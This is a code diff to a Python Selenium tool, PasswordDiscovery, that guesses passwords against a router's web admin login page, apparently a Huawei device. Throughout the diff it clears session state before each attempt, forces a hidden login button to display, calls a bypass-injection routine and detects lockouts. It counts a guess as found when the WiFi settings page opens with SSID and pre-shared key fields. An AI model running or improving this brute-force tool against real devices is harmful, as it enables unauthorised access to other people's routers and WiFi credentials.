@@ -126,8 +126,6 @@ class PasswordDiscovery:
         """Detect server-side lockout via JS variables."""
         try:
             return self._driver.execute_script("""
-                var el = document.getElementById('loginfail');
-                if (el && el.style.display !== 'none') return true;
                 return (window.LockLeftTime || 0) > 0;
             """)
         except Exception:
@@ -162,38 +160,44 @@ class PasswordDiscovery:
         Test a single password. Returns 'found', 'locked', or 'failed'.
         """
         try:
-            # Clear cookies to ensure fresh login session each time
             try:
                 self._driver.delete_all_cookies()
-                self._driver.execute_script("window.localStorage.clear(); window.sessionStorage.clear();")
+                self._driver.execute_script(
+                    "window.localStorage.clear(); window.sessionStorage.clear();"
+                )
             except Exception:
                 pass
 
-            # Navigate directly to login page
             self._driver.get(self.target_url + "/login.asp")
-            time.sleep(1)
 
-            # Wait for login form to be ready
             try:
-                from selenium.webdriver.support.ui import WebDriverWait
-                from selenium.webdriver.support import expected_conditions as EC
-                WebDriverWait(self._driver, 5).until(
+                WebDriverWait(self._driver, 10).until(
                     EC.presence_of_element_located((By.ID, "txt_Username"))
                 )
             except Exception:
                 self._driver.get(self.target_url + "/")
-                time.sleep(1)
                 try:
-                    WebDriverWait(self._driver, 5).until(
+                    WebDriverWait(self._driver, 10).until(
                         EC.presence_of_element_located((By.ID, "txt_Username"))
                     )
                 except Exception:
-                    pass
+                    logger.debug("Login form never appeared")
+                    return "failed"
 
-            # Inject bypasses
+            try:
+                WebDriverWait(self._driver, 8).until(
+                    lambda d: d.find_element(By.ID, "button").is_displayed()
+                )
+            except Exception:
+                self._driver.execute_script(
+                    "document.getElementById('button').style.display = '';"
+                )
+
             self._inject_bypasses()
 
-            # Verify login form exists
+            if self._is_server_locked():
+                return "locked"
+
             try:
                 user_field = self._driver.find_element(By.ID, "txt_Username")
                 pass_field = self._driver.find_element(By.ID, "txt_Password")
@@ -201,66 +205,50 @@ class PasswordDiscovery:
                 logger.debug(f"Login form not found at {self._driver.current_url}")
                 return "failed"
 
-            # Fill in credentials
-            user_field.clear()
+            self._driver.execute_script("arguments[0].value = '';", user_field)
+            self._driver.execute_script("arguments[0].value = '';", pass_field)
             user_field.send_keys(username)
-            pass_field.clear()
             pass_field.send_keys(password)
 
-            # Click login
             login_btn = self._driver.find_element(By.ID, "button")
             login_btn.click()
 
-            time.sleep(2.5)
+            time.sleep(3)
 
             post_login_url = self._driver.current_url
 
-            # Failed logins may redirect to / (root), not login.asp
-            # Only check that we're NOT on login page or login.cgi
             if "login.asp" in post_login_url or "login.cgi" in post_login_url:
+                if self._is_server_locked():
+                    return "locked"
                 return "failed"
 
-            # Verify by accessing a protected page
             try:
                 self._driver.get(self.target_url + "/html/amp/wlanbasic/WlanBasic.asp?2G")
-                time.sleep(3)
+                time.sleep(2)
                 protected_url = self._driver.current_url
 
-                # If redirected to login page, auth failed
-                if "login.asp" in protected_url:
+                if "login.asp" in protected_url or "login.cgi" in protected_url:
                     return "failed"
 
-                # Check the page source for WiFi config indicators
-                # The page uses iframes that load dynamically, so check for iframe tags
                 page_source = self._driver.page_source
                 has_login_form = "txt_Username" in page_source
 
-                # If we see the login form on the protected page, we're not authenticated
                 if has_login_form:
                     return "failed"
 
-                # Check for WiFi content indicators in the page
-                # Huawei pages include specific JS variables and elements when authenticated
-                has_wifi_content = (
-                    "WlanBasic" in protected_url or
-                    "wlan" in protected_url.lower() or
-                    "Ssid" in page_source or
-                    "ssid" in page_source.lower() or
-                    "wlanBasic" in page_source or
-                    "FrameWlanSetting" in page_source or
-                    "frameWlan" in page_source
-                )
-
-                # Also check that the page title isn't an error
                 title = self._driver.title
                 is_error = "403" in title or "Forbidden" in title or "Error" in title
 
-                if has_wifi_content and not is_error:
+                if "/wlanbasic/" in protected_url.lower() and not is_error:
                     return "found"
 
-                # If the URL is the protected page but no specific content found,
-                # it might still be valid — check if URL path matches
-                if "/wlanbasic/" in protected_url.lower() and not is_error:
+                has_wifi_form = (
+                    "wlSsid" in page_source or
+                    "wlWpaPsk" in page_source or
+                    "PreSharedKey" in page_source or
+                    "FrameWlanSetting" in page_source
+                )
+                if has_wifi_form and not is_error:
                     return "found"
 
                 return "failed"
@@ -268,12 +256,6 @@ class PasswordDiscovery:
             except Exception as e:
                 logger.debug(f"Protected page verification failed: {e}")
                 return "failed"
-
-            # Check if server locked us
-            if self._is_server_locked():
-                return "locked"
-
-            return "failed"
 
         except Exception as e:
             logger.debug(f"Password test error: {e}")
